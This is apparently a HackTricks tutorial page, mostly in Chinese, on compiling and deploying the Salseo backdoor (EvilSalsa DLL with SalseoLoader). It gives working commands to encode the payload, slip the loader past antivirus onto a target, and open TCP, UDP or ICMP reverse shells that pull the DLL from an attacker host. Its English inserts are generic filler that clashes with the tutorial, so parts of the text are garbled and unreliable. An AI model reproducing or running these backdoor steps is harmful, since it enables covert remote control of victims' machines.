# Salseo

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？想要在HackTricks中**宣传你的公司**吗？或者你想要**获取PEASS的最新版本或下载HackTricks的PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks的衣物**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>

## 编译二进制文件

从github下载源代码并编译**EvilSalsa**和**SalseoLoader**。你需要安装**Visual Studio**来编译代码。

将这些项目编译为你将要使用它们的Windows系统的架构（如果Windows支持x64，则编译为该架构）。

你可以在Visual Studio中的**左侧"Build"选项卡**中选择架构，在**"Platform Target"**中。

(\*\*如果你找不到这些选项，请点击**"Project Tab"**，然后点击**"\<Project Name> Properties"**)

![](<../.gitbook/assets/image (132).png>)

然后，构建这两个项目（Build -> Build Solution）（在日志中将显示可执行文件的路径）：

![](<../.gitbook/assets/image (1) (2) (1) (1) (1).png>)

## 准备后门

首先，你需要对**EvilSalsa.dll**进行编码。你可以使用python脚本**encrypterassembly.py**或者编译项目**EncrypterAssembly**来进行编码：

### **Python**
```
python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
```
### Windows

#### Salseo Backdoor

The Salseo backdoor is a type of malware that provides unauthorized access to a compromised Windows system. It is designed to remain hidden and undetected, allowing an attacker to maintain persistent control over the infected machine.

##### Functionality

Once installed on a target system, the Salseo backdoor establishes a covert communication channel with a remote command and control (C2) server. This allows the attacker to remotely execute commands on the compromised system and retrieve sensitive information.

The backdoor is capable of performing various malicious activities, including:

1. **Remote Access**: The attacker can gain full control over the infected system, enabling them to perform actions as if they were physically present.

2. **Data Exfiltration**: The backdoor can steal sensitive data from the compromised system, such as login credentials, financial information, or intellectual property.

3. **Keylogging**: Salseo can capture keystrokes, allowing the attacker to monitor and record user activities, including passwords and other confidential information.

4. **File Manipulation**: The backdoor can create, modify, or delete files on the compromised system, giving the attacker the ability to plant additional malware or tamper with existing files.

5. **System Surveillance**: Salseo can gather information about the infected system, such as hardware specifications, installed software, and network configurations. This information can be used to identify potential vulnerabilities or gather intelligence for future attacks.

##### Infection Vectors

The Salseo backdoor can be delivered through various infection vectors, including:

1. **Email Attachments**: Malicious email attachments, such as infected documents or executables, can be used to deliver the backdoor to unsuspecting users.

2. **Drive-by Downloads**: Visiting compromised or malicious websites can result in the automatic download and execution of the Salseo backdoor.

3. **Exploiting Vulnerabilities**: The backdoor can exploit known vulnerabilities in software or operating systems to gain unauthorized access to a system.

4. **Social Engineering**: Attackers may use social engineering techniques, such as phishing emails or fake software updates, to trick users into downloading and executing the backdoor.

##### Detection and Prevention

Detecting and preventing the Salseo backdoor requires a multi-layered approach, including:

1. **Antivirus Software**: Regularly update and use reputable antivirus software to detect and remove known malware, including the Salseo backdoor.

2. **Patch Management**: Keep software and operating systems up to date with the latest security patches to minimize the risk of exploitation.

3. **User Education**: Train users to recognize and avoid common social engineering techniques, such as phishing emails or suspicious downloads.

4. **Network Monitoring**: Implement network monitoring tools to detect unusual or suspicious network traffic that may indicate the presence of the backdoor.

5. **Firewall Configuration**: Configure firewalls to restrict unauthorized inbound and outbound network connections, limiting the backdoor's ability to communicate with the remote C2 server.

By implementing these measures, organizations can enhance their security posture and reduce the risk of falling victim to the Salseo backdoor.
```
EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
```
好的，现在你已经拥有执行所有Salseo操作所需的一切：**编码的EvilDalsa.dll**和**SalseoLoader的二进制文件**。

**将SalseoLoader.exe二进制文件上传到目标机器。它们不应该被任何杀毒软件检测到...**

## **执行后门**

### **获取TCP反向Shell（通过HTTP下载编码的dll）**

记得启动一个nc作为反向Shell监听器，并启动一个HTTP服务器来提供编码的evilsalsa。
```
SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
```
### **获取UDP反向shell（通过SMB下载编码的dll）**

记得启动一个nc作为反向shell监听器，并启动一个SMB服务器来提供编码的evilsalsa（impacket-smbserver）。
```
SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
```
### **获取一个ICMP反向shell（已经在受害者内部编码的dll）**

**这次你需要在客户端上使用一个特殊的工具来接收反向shell。下载：** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)

#### **禁用ICMP回复：**
```
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#You finish, you can enable it again running:
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```
#### 执行客户端：

To execute the client, you need to follow these steps:

1. Make sure you have the client file downloaded and saved on your local machine.

2. Open a terminal or command prompt.

3. Navigate to the directory where the client file is located using the `cd` command.

4. Once you are in the correct directory, run the client file by typing its name followed by the appropriate command. For example, if the client file is named `client.exe`, you would type `client.exe` and press Enter.

5. The client will then execute and start running on your machine.

Remember to exercise caution when executing any files, especially those obtained from untrusted sources. Always scan files for malware before running them.
```
python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
```
#### 在受害者内部，让我们执行salseo操作：
```
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
```
## 将SalseoLoader编译为导出主函数的DLL

使用Visual Studio打开SalseoLoader项目。

### 在主函数之前添加：\[DllExport]

![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

### 为该项目安装DllExport

#### **工具** --> **NuGet程序包管理器** --> **管理解决方案的NuGet程序包...**

![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

#### **搜索DllExport包（使用浏览选项卡），然后点击安装（并接受弹出窗口）**

![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1).png>)

在项目文件夹中会出现以下文件：**DllExport.bat**和**DllExport\_Configure.bat**

### **卸载DllExport**

点击**卸载**（是的，很奇怪，但相信我，这是必要的）

![](<../.gitbook/assets/image (5) (1) (1) (2) (1).png>)

### **退出Visual Studio并执行DllExport\_configure**

只需**退出**Visual Studio

然后，转到**SalseoLoader文件夹**并**执行DllExport\_Configure.bat**

选择**x64**（如果您将在x64系统中使用它，这是我的情况），选择**System.Runtime.InteropServices**（在**DllExport的命名空间**中）并点击**应用**

![](<../.gitbook/assets/image (7) (1) (1) (1).png>)

### **再次使用Visual Studio打开项目**

**\[DllExport]**不再被标记为错误

![](<../.gitbook/assets/image (8) (1).png>)

### 构建解决方案

选择**输出类型=类库**（项目 --> SalseoLoader属性 --> 应用程序 --> 输出类型=类库）

![](<../.gitbook/assets/image (10) (1).png>)

选择**x64平台**（项目 --> SalseoLoader属性 --> 构建 --> 平台目标=x64）

![](<../.gitbook/assets/image (9) (1) (1).png>)

要**构建**解决方案：构建 --> 构建解决方案（在输出控制台中将显示新DLL的路径）

### 测试生成的DLL

将DLL复制并粘贴到要进行测试的位置。

执行：
```
rundll32.exe SalseoLoader.dll,main
```
如果没有出现错误，那么你可能有一个功能正常的DLL！！

## 使用DLL获取一个shell

不要忘记使用一个**HTTP** **服务器**并设置一个**nc** **监听器**

### Powershell
```
$env:pass="password"
$env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
$env:lhost="10.2.0.5"
$env:lport="1337"
$env:shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```
### CMD

CMD (Command Prompt) is a command-line interpreter in Windows operating systems. It provides a text-based interface for executing commands and managing the system. CMD can be used to perform various tasks, such as navigating through directories, running programs, and managing files and processes.

CMD is a powerful tool for hackers as it allows them to execute commands and scripts on a target system. By gaining access to CMD, hackers can exploit vulnerabilities, escalate privileges, and gain control over the target system.

To access CMD, you can open the Start menu, type "cmd" in the search bar, and press Enter. This will open the Command Prompt window, where you can start executing commands.

It is important to note that CMD should only be used for legitimate purposes, such as system administration or troubleshooting. Using CMD for malicious activities is illegal and unethical.
```
set pass=password
set payload=http://10.2.0.5/evilsalsax64.dll.txt
set lhost=10.2.0.5
set lport=1337
set shell=reversetcp
rundll32.exe SalseoLoader.dll,main
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？想要在HackTricks中看到你的**公司广告**吗？或者你想要**获取PEASS的最新版本或下载HackTricks的PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>
